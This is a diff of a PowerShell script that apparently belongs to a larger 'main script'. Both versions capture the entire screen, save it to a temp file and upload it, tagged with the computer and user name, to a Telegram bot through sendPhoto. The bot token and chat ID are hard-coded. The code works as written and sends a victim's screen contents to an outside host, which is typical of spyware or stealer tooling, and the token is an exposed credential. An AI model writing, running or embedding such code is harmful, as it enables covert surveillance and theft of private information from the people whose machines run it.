@@ -1,85 +1,22 @@
-# SIMPLE SCREENSHOT TO TELEGRAM
-# Works with the same bot token and chat ID from your main script
+# TEST THIS SIMPLE VERSION FIRST
+$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+$y = "2146236602"
 
-# Configuration (same as your main script)
-$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"  # Bot token
-$y = "2146236602"  # Chat ID
+# Take screenshot
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap=New-Object Drawing.Bitmap $screen.Width,$screen.Height
+$graphics=[Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size)
+$path="$env:TEMP\test_ss.png"
+$bitmap.Save($path)
+$graphics.Dispose();$bitmap.Dispose()
 
-# Function to capture and send screenshot
-function Capture-Screenshot {
-    Write-Host "📸 Taking screenshot..." -ForegroundColor Yellow
-    
-    try {
-        # Load required assemblies
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        # Capture screen
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-        
-        # Save to temp file
-        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        
-        Write-Host "✅ Screenshot saved: $screenshotPath" -ForegroundColor Green
-        
-        # Send to Telegram (using same method as your main script)
-        Write-Host "📤 Sending to Telegram..." -ForegroundColor Yellow
-        
-        # Create caption
-        $caption = "🖥️ Screenshot from $env:COMPUTERNAME`n👤 User: $env:USERNAME`n📍 Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        
-        # Read file bytes
-        $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        
-        # Build multipart form data
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            "$y",
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"caption`"",
-            "",
-            "$caption",
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"photo`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
-            "Content-Type: image/png",
-            "",
-            $fileEnc,
-            "--$boundary--"
-        ) -join $LF
-        
-        $uri = "https://api.telegram.org/bot$x/sendPhoto"
-        
-        # Send request
-        $response = Invoke-RestMethod -Uri $uri -Method Post `
-            -ContentType "multipart/form-data; boundary=$boundary" `
-            -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
-        
-        if ($response.ok) {
-            Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
-            # Cleanup
-            Remove-Item $screenshotPath -Force
-        } else {
-            Write-Host "❌ Telegram API error" -ForegroundColor Red
-        }
-        
-    } catch {
-        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
+# Send using curl (most reliable)
+curl -s -X POST "https://api.telegram.org/bot$x/sendPhoto" `
+  -F "chat_id=$y" `
+  -F "caption=Test screenshot from PowerShell" `
+  -F "photo=@$path"
 
-# Execute
-Clear-Host
-Write-Host "Screenshot to Telegram Test" -ForegroundColor Cyan
-Write-Host "===========================" -ForegroundColor Cyan
-Capture-Screenshot
+# Cleanup
+Remove-Item $path
